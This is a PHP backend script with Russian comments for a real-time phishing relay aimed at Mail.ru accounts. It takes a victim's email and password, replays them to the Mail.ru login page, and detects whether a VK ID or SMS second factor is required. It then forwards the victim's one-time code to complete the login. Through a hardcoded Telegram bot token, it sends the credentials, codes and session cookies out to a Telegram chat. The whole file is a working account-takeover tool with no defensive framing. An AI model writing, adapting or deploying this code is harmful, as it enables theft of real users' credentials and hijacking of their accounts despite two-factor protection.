<?php
// server.php - С распознаванием VK ID / SMS 2FA
header('Content-Type: application/json; charset=utf-8');
error_reporting(E_ALL);
ini_set('display_errors', 0);

const TELEGRAM_TOKEN = '8071951540:AAH9dJyp9_AUvPVrxYyDAFehMY-_YWpFppU'; // ЗАМЕНИ!
const TELEGRAM_CHAT_ID = '8290282413'; // ЗАМЕНИ!
const SESSION_DIR = __DIR__ . '/sessions/';
const LOGIN_URL = 'https://account.mail.ru/login';
const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

if (!is_dir(SESSION_DIR)) mkdir(SESSION_DIR, 0777, true);

// cURL функция (улучшена для Location парсинга)
function curlRequest($url, $options = [], $postData = null) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false, // Не follow, чтобы поймать 302
        CURLOPT_MAXREDIRS => 0,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_USERAGENT => USER_AGENT,
        CURLOPT_REFERER => LOGIN_URL,
        CURLOPT_COOKIEJAR => '', // Встроенный, но для простоты используем string
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HEADER => true,
    ] + $options);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($postData) ? http_build_query($postData) : $postData);
    }
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    $cookies = []; // Парсим Set-Cookie из headers
    preg_match_all('/Set-Cookie: ([^=]+)=([^;]+)/', $headers, $matches);
    for ($i = 0; $i < count($matches[1]); $i++) {
        $cookies[$matches[1][$i]] = $matches[2][$i];
    }
    $cookieStr = http_build_query($cookies, '', '; ');
    // Location из 302
    preg_match('/Location: (.*)/i', $headers, $locMatch);
    $location = $locMatch[1] ?? '';
    curl_close($ch);
    return [
        'body' => $body,
        'headers' => $headers,
        'httpCode' => $httpCode,
        'cookies' => $cookieStr,
        'location' => trim($location)
    ];
}

// Парсинг формы (DOM + params из URL)
function parseFormTokens($html, $url = '') {
    $dom = new DOMDocument();
    @$dom->loadHTML($html);
    $xpath = new DOMXPath($dom);
    $inputs = [];
    $form = $xpath->query("//form")->item(0); // Первая форма
    if ($form) {
        foreach ($xpath->query(".//input[@name]", $form) as $input) {
            $name = $input->getAttribute('name');
            $value = $input->getAttribute('value');
            if ($name && $input->getAttribute('type') !== 'submit') {
                $inputs[$name] = $value ?: '';
            }
        }
    }
    // Params из URL (для VK)
    if ($url) {
        parse_str(parse_url($url, PHP_URL_QUERY), $urlParams);
        $inputs = array_merge($inputs, $urlParams);
    }
    return $inputs;
}

function sendToTg($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendMessage";
    $data = http_build_query(['chat_id' => TELEGRAM_CHAT_ID, 'text' => $message, 'parse_mode' => 'HTML']);
    $ch = curl_init($url);
    curl_setopt_array($ch, [CURLOPT_POST => 1, CURLOPT_POSTFIELDS => $data, CURLOPT_RETURNTRANSFER => true]);
    curl_exec($ch);
    curl_close($ch);
}

// /login-attempt
if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['REQUEST_URI'], '/login-attempt') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $email = trim($input['email'] ?? '');
    $password = $input['password'] ?? '';
    if (!$email || !$password) {
        echo json_encode(['success' => false, 'error' => 'Нет email/password']);
        exit;
    }
    $challengeId = uniqid('challenge_');

    // Шаг 1: GET login
    $getLogin = curlRequest(LOGIN_URL);
    $tokens = parseFormTokens($getLogin['body']);

    // Шаг 2: POST email
    $postEmailData = array_merge($tokens, ['login' => $email]);
    $postEmail = curlRequest(LOGIN_URL, [], $postEmailData);

    // Шаг 3: POST password (с токенами из email-ответа)
    $tokensPwd = parseFormTokens($postEmail['body']);
    $postPwdData = array_merge($tokensPwd, ['password' => $password]);
    $postPwd = curlRequest(LOGIN_URL, [], $postPwdData);

    // Распознавание 2FA
    $location = $postPwd['location'];
    $body = $postPwd['body'];
    $type = 'sms'; // Дефолт
    $twoFaUrl = $location ?: LOGIN_URL;
    $sessionData = ['type' => $type, '2fa_url' => $twoFaUrl, 'tokens' => parseFormTokens($body, $location)];

    if (strpos($location, 'vk.com') !== false || strpos($location, 'id.vk.com') !== false) {
        $type = 'vkid';
        $twoFaUrl = $location;
        $sessionData['type'] = 'vkid';
        $sessionData['2fa_url'] = $twoFaUrl;
    }

    // Сохраняем сессию (JSON + cookies)
    $cookies = $postPwd['cookies'];
    $sessionData['cookies'] = $cookies;
    file_put_contents(SESSION_DIR . "session_{$challengeId}.json", json_encode($sessionData));

    // TG базовые
    $dataForTg = ['email' => $email, 'password' => $password, 'userAgent' => USER_AGENT, 'ip' => $_SERVER['REMOTE_ADDR'] ?? 'N/A', 'timestamp' => date('c')];
    sendToTg('<b>Основные creds:</b> ' . json_encode($dataForTg, JSON_UNESCAPED_UNICODE));

    if (strpos($postPwd['location'], 'messages/inbox') !== false || strpos($body, 'inbox') !== false) {
        // Без 2FA
        unlink(SESSION_DIR . "session_{$challengeId}.json");
        sendToTg("Успех без 2FA для {$email}. Cookies: " . substr($cookies, 0, 200) . '...');
        echo json_encode(['success' => true, 'needs_2fa' => false, 'session' => ['cookies' => $cookies]]);
    } else {
        // 2FA
        sendToTg("2FA ({$type}) требуется для {$email}. Challenge: {$challengeId}");
        echo json_encode(['success' => true, 'needs_2fa' => true, 'challengeId' => $challengeId, 'type' => $type]); // Добавили type
    }
    exit;
}

// /complete-login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['REQUEST_URI'], '/complete-login') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $challengeId = $input['challengeId'] ?? '';
    $code = $input['code'] ?? '';
    $email = $input['email'] ?? '';

    $sessionFile = SESSION_DIR . "session_{$challengeId}.json";
    if (!file_exists($sessionFile)) {
        echo json_encode(['success' => false, 'error' => 'Сессия не найдена']);
        exit;
    }
    $sessionData = json_decode(file_get_contents($sessionFile), true);
    $type = $sessionData['type'] ?? 'sms';
    $twoFaUrl = $sessionData['2fa_url'] ?? '';
    $tokens = $sessionData['tokens'] ?? [];
    $cookies = $sessionData['cookies'] ?? '';

    $opts = [CURLOPT_COOKIE => $cookies];
    $postCodeData = array_merge($tokens, ['code' => $code]);

    // POST код
    $postCode = curlRequest($twoFaUrl, $opts, $postCodeData);

    $finalLocation = $postCode['location'];
    $finalBody = $postCode['body'];
    $finalCookies = $postCode['cookies'];

    unlink($sessionFile);

    if (strpos($finalLocation, 'messages/inbox') !== false || strpos($finalBody, 'inbox') !== false) {
        $dataForTg = ['email' => $email, 'code' => $code, 'type' => $type, 'session' => $finalCookies, 'timestamp' => date('c')];
        sendToTg('<b>Полная сессия ({$type}):</b> ' . json_encode($dataForTg, JSON_UNESCAPED_UNICODE));
        echo json_encode(['success' => true, 'session' => ['cookies' => $finalCookies]]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Неверный код']);
    }
    exit;
}

// /resend-2fa
if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['REQUEST_URI'], '/resend-2fa') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $challengeId = $input['challengeId'] ?? '';

    $sessionFile = SESSION_DIR . "session_{$challengeId}.json";
    if (!file_exists($sessionFile)) {
        echo json_encode(['success' => false]);
        exit;
    }
    $sessionData = json_decode(file_get_contents($sessionFile), true);
    $twoFaUrl = $sessionData['2fa_url'] ?? '';
    $cookies = $sessionData['cookies'] ?? '';

    $opts = [CURLOPT_COOKIE => $cookies];
    // Resend: Для VK/SMS — POST на /resend или клик-имитация (GET с params)
    $resendUrl = str_replace('/auth', '/resend', $twoFaUrl); // Адаптация
    $resend = curlRequest($resendUrl, $opts);
    $success = $resend['httpCode'] === 200 && (strpos($resend['body'], 'sent') !== false || strpos($resend['body'], 'код отправлен') !== false);

    echo json_encode(['success' => $success]);
    exit;
}

// 404
http_response_code(404);
echo json_encode(['error' => 'Роут не найден']);
?>
